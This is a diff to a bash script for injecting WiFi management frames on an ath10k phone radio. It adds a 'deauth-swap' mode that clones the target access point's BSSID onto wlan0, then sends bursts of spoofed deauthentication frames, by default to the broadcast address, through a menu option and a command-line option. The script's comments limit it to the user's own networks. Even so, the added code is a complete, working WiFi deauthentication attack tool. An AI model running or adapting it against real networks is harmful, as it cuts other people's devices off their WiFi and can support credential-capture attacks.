@@ -3,19 +3,29 @@
 # INTERNAL WiFi radio (ath10k/WCN3990), via the STA vdev offchannel/ROC path.
 # For your OWN networks / lab only.
 #
-# This WORKS on this device (verified over the air with an external witness):
-# the internal radio transmits probe/auth/deauth/etc. on a chosen channel while
-# wlan0 stays associated — it does NOT drop your WiFi. The one hardware limit is
-# that the frame's source address (addr2/SA) is forced to wlan0's own MAC
-# (cfg80211 does not allow spoofing the transmitter on ath10k); addr1 (dest) and
-# addr3 (BSSID) are free.
+# TWO WAYS to spoof the source address (addr2/SA):
+#
+#   1) STANDARD mode (needs kernel patch 0118 AUTH_AND_DEAUTH_RANDOM_TA):
+#      keeps wlan0 associated. Uses the ext-feature to let the driver
+#      accept a frame whose addr2 doesn't match wlan0's own MAC.
+#   2) MAC-SWAP mode (works on stock kernels, no patches needed):
+#      briefly tears down wlan0, changes its MAC address to the target
+#      BSSID, brings it back up, injects, then restores the original
+#      MAC and reconnects. Interrupts your WiFi for ~10 seconds per
+#      burst, but works on ANY kernel.
+#
+# This WORKS on this device (verified over the air): the internal radio
+# transmits probe/auth/deauth on a chosen channel via the STA offchannel/ROC
+# path.
 #
 # Modes:
-#   sudo rhodep-inject-lab            # interactive menu
-#   sudo rhodep-inject-lab probe  <freq> [dest] [bssid] [count]
-#   sudo rhodep-inject-lab deauth <freq>  <dest>  <bssid> [count] [reason]
-#   sudo rhodep-inject-lab raw    <freq> <hexframe> [count]
-#   sudo rhodep-inject-lab witness <freq>            # verify OTA with TP-Link
+#   sudo rhodep-inject-lab                        # interactive menu
+#   sudo rhodep-inject-lab probe    <freq> [dest] [bssid] [count]
+#   sudo rhodep-inject-lab deauth   <freq> <dest> <bssid> [count] [reason]
+#   sudo rhodep-inject-lab deauth-swap <freq> <dest> <bssid> [count] [reason]
+#     ^ MAC-SWAP mode, works without patch 0118 (item 15)
+#   sudo rhodep-inject-lab raw      <freq> <hexframe> [count]
+#   sudo rhodep-inject-lab witness  <freq>        # verify OTA with TP-Link
 # (intentionally no set -e/-u: never abort mid-run.)
 
 TX=/usr/local/sbin/nl80211-mgmt-tx.py
@@ -63,6 +73,85 @@ mk_deauth_own(){ # variant with our real MAC as SA (mostly useless — client ig
 	local dst bss self r; dst=$(clean "$1"); bss=$(clean "$2"); self=$(selfhex)
 	r=$(printf '%02x00' "${3:-7}")
 	echo "c0000000${dst}${self}${bss}0000${r}"
+}
+
+deauth_swap(){ # $1=freq $2=dst $3=bssid $4=count $5=reason
+	# MAC-SWAP mode: no patch 0118 required. Works on any kernel that supports
+	# NL80211_ATTR_OFFCHANNEL_TX_OK on a STA vif (all mainline for >5 years).
+	#
+	# Sequence:
+	#   1. Save wlan0's current MAC.
+	#   2. Stop NetworkManager, kill wpa_supplicant, drop wlan0.
+	#   3. Set wlan0's MAC = the target BSSID (so cfg80211's forced addr2
+	#      becomes the BSSID we want to spoof).
+	#   4. Bring wlan0 back up (as STA but not associated).
+	#   5. NL80211_CMD_FRAME with OFFCHANNEL_TX_OK to send the deauth on the
+	#      target channel.
+	#   6. Restore original MAC, restart NM, reconnect.
+	need_root
+	local freq="$1" dst=$(clean "$2") bss=$(clean "$3") count="${4:-30}" reason="${5:-7}"
+	[ -z "$freq" ] || [ -z "$dst" ] || [ -z "$bss" ] && {
+		echo "usage: rhodep-inject-lab deauth-swap <freq_mhz> <dest_mac> <bssid_mac> [count] [reason]"
+		return 1
+	}
+	local orig_mac; orig_mac=$(selfmac)
+	local orig_conn; orig_conn=$(nmcli -t -f NAME,DEVICE con show --active | awk -F: -v d=$IF '$2==d{print $1}' | head -1)
+	local bss_colon; bss_colon=$(echo "$bss" | sed 's/../&:/g;s/:$//')
+	local r_hex; r_hex=$(printf '%02x00' "$reason")
+	local frame="c0000000${dst}${bss}${bss}0000${r_hex}"
+
+	echo "${c_c}deauth-swap${c_0} freq=$freq dst=$dst bssid=$bss count=$count reason=$reason"
+	echo "  orig MAC: $orig_mac ; spoofed MAC (target BSSID): $bss_colon"
+	[ -n "$orig_conn" ] && echo "  saving connection '$orig_conn' for restore"
+
+	# 1. Drop wlan0
+	echo "  1. tearing down wlan0..."
+	nmcli radio wifi off 2>/dev/null
+	pkill -9 wpa_supplicant 2>/dev/null
+	systemctl stop NetworkManager 2>/dev/null
+	sleep 1
+	ip link set $IF down 2>/dev/null
+
+	# 2. Change MAC
+	echo "  2. setting MAC to $bss_colon..."
+	ip link set $IF address "$bss_colon" || { echo "${c_r}MAC change failed${c_0}"; }
+	rfkill unblock wifi
+	ip link set $IF up
+	sleep 2
+
+	# 3. Inject
+	echo "  3. injecting $count deauth on freq $freq..."
+	dmesg -C >/dev/null 2>&1
+	local ok=0
+	for i in $(seq 1 "$count"); do
+		python3 "$TX" $IF "$freq" "$frame" 200 >/dev/null 2>&1 && ok=$((ok+1))
+		sleep 0.05
+	done
+	sleep 2
+	local st; st=$(dmesg 2>/dev/null | grep mgmt-tx-compl | grep -oE 'status=[0-9]+' | sort | uniq -c | tr '\n' ' ')
+	echo "  injected: $ok/$count   fw completions: ${st:-none}"
+	echo "  ${c_y}status=0 = radiated over the air${c_0}"
+
+	# 4. Restore
+	echo "  4. restoring wlan0..."
+	ip link set $IF down
+	ip link set $IF address "$orig_mac" 2>/dev/null
+	ip link set $IF up
+	systemctl start NetworkManager
+	sleep 2
+	nmcli radio wifi on 2>/dev/null
+	sleep 2
+	if [ -n "$orig_conn" ]; then
+		nmcli con up "$orig_conn" 2>/dev/null || true
+	fi
+	sleep 3
+	local link; link=$(iw dev $IF link 2>/dev/null | head -1)
+	if echo "$link" | grep -q Connected; then
+		echo "  ${c_g}wlan0 restored: $link${c_0}"
+	else
+		echo "  ${c_y}wlan0 not yet reconnected: $link${c_0}"
+		echo "  (may take another few seconds; try 'nmcli con up <NAME>' if it hangs)"
+	fi
 }
 
 witness(){ # $1=freq  -- set TP-Link as monitor, inject, confirm OTA
@@ -136,9 +225,10 @@ menu(){
 	check_random_ta
 	echo
 	echo "  1) probe-request burst"
-	echo "  2) deauth burst (spoofed as the AP — needs patch 0118)"
-	echo "  3) send a raw hex frame"
-	echo "  4) verify over-the-air with the TP-Link"
+	echo "  2) deauth burst (needs patch 0118, wlan0 stays associated)"
+	echo "  3) deauth-swap (works without patches, tears down wlan0 briefly)"
+	echo "  4) send a raw hex frame"
+	echo "  5) verify over-the-air with the TP-Link"
 	read -rp "choice: " ch
 	read -rp "channel number (e.g. 11, or 36 for 5GHz): " cn
 	local freq; freq=$(ch2freq "$cn")
@@ -150,8 +240,13 @@ menu(){
 	     [ -z "$b" ] && { echo "AP BSSID is required"; return; }
 	     echo "sending 40 deauth bursts (DA=$d SA=BSSID=$b reason=7) on $cn ..."
 	     tx_frame "$freq" "$(mk_deauth "$d" "$b" 7)" 40 ;;
-	  3) read -rp "hex frame: " f; tx_frame "$freq" "$(clean "$f")" 10 ;;
-	  4) witness "$freq" ;;
+	  3) read -rp "target client/DA MAC (blank=broadcast): " d
+	     read -rp "AP BSSID: " b
+	     [ -z "$d" ] && d="ffffffffffff"
+	     [ -z "$b" ] && { echo "AP BSSID is required"; return; }
+	     deauth_swap "$freq" "$d" "$b" 30 7 ;;
+	  4) read -rp "hex frame: " f; tx_frame "$freq" "$(clean "$f")" 10 ;;
+	  5) witness "$freq" ;;
 	  *) echo "invalid";;
 	esac
 }
@@ -164,8 +259,11 @@ case "$cmd" in
 	         tx_frame "$freq" "$(mk_probe "${2:-ffffffffffff}" "${3:-}")" "${4:-20}" ;;
 	deauth)  freq="$1"; [ "$1" -le 200 ] 2>/dev/null && freq=$(ch2freq "$1")
 	         tx_frame "$freq" "$(mk_deauth "$2" "$3" "${5:-7}")" "${4:-20}" ;;
+	deauth-swap)
+	         freq="$1"; [ "$1" -le 200 ] 2>/dev/null && freq=$(ch2freq "$1")
+	         deauth_swap "$freq" "$2" "$3" "${4:-30}" "${5:-7}" ;;
 	raw)     freq="$1"; [ "$1" -le 200 ] 2>/dev/null && freq=$(ch2freq "$1")
 	         tx_frame "$freq" "$(clean "$2")" "${3:-10}" ;;
 	witness) freq="$1"; [ "$1" -le 200 ] 2>/dev/null && freq=$(ch2freq "$1"); witness "$freq" ;;
-	*) echo "usage: rhodep-inject-lab [menu|probe|deauth|raw|witness] ..."; exit 1;;
+	*) echo "usage: rhodep-inject-lab [menu|probe|deauth|deauth-swap|raw|witness] ..."; exit 1;;
 esac
